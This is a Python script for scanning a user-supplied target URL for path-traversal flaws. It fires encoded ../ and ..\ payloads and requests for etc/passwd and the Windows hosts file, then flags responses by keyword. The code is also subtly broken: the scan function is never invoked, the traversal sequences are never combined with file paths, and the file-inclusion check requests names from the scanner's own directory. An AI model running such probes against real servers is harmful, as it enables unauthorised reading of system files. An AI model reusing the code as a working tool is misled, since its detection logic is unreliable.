import requests
import time
import os
import csv
from prettytable import PrettyTable
from threading import Lock

# Initialize a lock for thread safety
lock = Lock()

def send_request(url, data=None, allow_redirects=True):
    """Send an HTTP request to the specified URL."""
    try:
        if data:
            response = requests.post(url, data=data, allow_redirects=allow_redirects)
        else:
            response = requests.get(url, allow_redirects=allow_redirects)
        return response
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

def test_path_traversal(url, payloads):
    """Test for path traversal vulnerabilities using the provided payloads."""
    main_table = PrettyTable(["URL", "Payload", "Response Code", "Path Traversal Detected"])
    main_table.align["Path Traversal Detected"] = "l"

    additional_table = PrettyTable(["URL", "Check Type", "Result"])
    additional_table.align["Check Type"] = "l"

    for payload in payloads:
        test_url = f"{url}/{payload}"
        response = send_request(test_url, allow_redirects=False)
        
        if response:
            response_code = response.status_code
            path_traversal_detected = "No"

            if "root:" in response.text.lower() or "windows:" in response.text.lower():
                path_traversal_detected = "Yes"
                main_table.add_row([test_url, payload, response_code, "Yes"])
            elif "Permission denied" in response.text or "Forbidden" in response.text:
                main_table.add_row([test_url, payload, response_code, "Potential"])
                additional_table.add_row([test_url, "Potential Path Traversal", "Detected"])
            else:
                main_table.add_row([test_url, payload, response_code, "No"])
        else:
            main_table.add_row([test_url, payload, "No Response", "N/A"])
        
        time.sleep(0.1)

    # Print the main results table
    print(main_table)

    # Perform additional checks for path traversal
    print("\nAdditional Checks:")
    for payload in payloads:
        test_url = f"{url}/{payload}"
        response = send_request(test_url, allow_redirects=False)
        
        if response:
            # Check for directory listing
            if "Directory of" in response.text or "Index of" in response.text:
                additional_table.add_row([test_url, "Directory Listing", "Detected"])
            
            # Check for file inclusion
            if ".php" in response.text or ".asp" in response.text or ".jsp" in response.text:
                additional_table.add_row([test_url, "File Inclusion", "Detected"])
            
            # Check for operating system
            if "windows" in response.text.lower() or "linux" in response.text.lower():
                additional_table.add_row([test_url, "Operating System Disclosure", "Detected"])
            
            # Check for version information
            if "Apache" in response.text or "Nginx" in response.text or "IIS" in response.text:
                additional_table.add_row([test_url, "Version Information Disclosure", "Detected"])
        
        time.sleep(0.1)

    # Print the additional checks table
    print(additional_table)

    # Check for local file inclusion
    print("\nLocal File Inclusion Checks:")
    for file in os.listdir("."):
        test_url = f"{url}/{file}"
        response = send_request(test_url, allow_redirects=False)
        
        if response:
            if file in response.text:
                additional_table.add_row([test_url, "Local File Inclusion", "Detected"])
        
        time.sleep(0.1)

    # Print the local file inclusion results
    print(additional_table)

target_url = input("Enter the target URL: ")
path_traversal_payloads = [
    "..%2f",  # URL-encoded ../
    "..%2f..%2f",  # URL-encoded ../../
    "etc/passwd",  # Common file path for Unix
    "C:/Windows/System32/drivers/etc/hosts",  # Common file path for Windows
    "..%5c",  # URL-encoded ..\
    "..%5c..%5c",  # URL-encoded ..\..
    ]
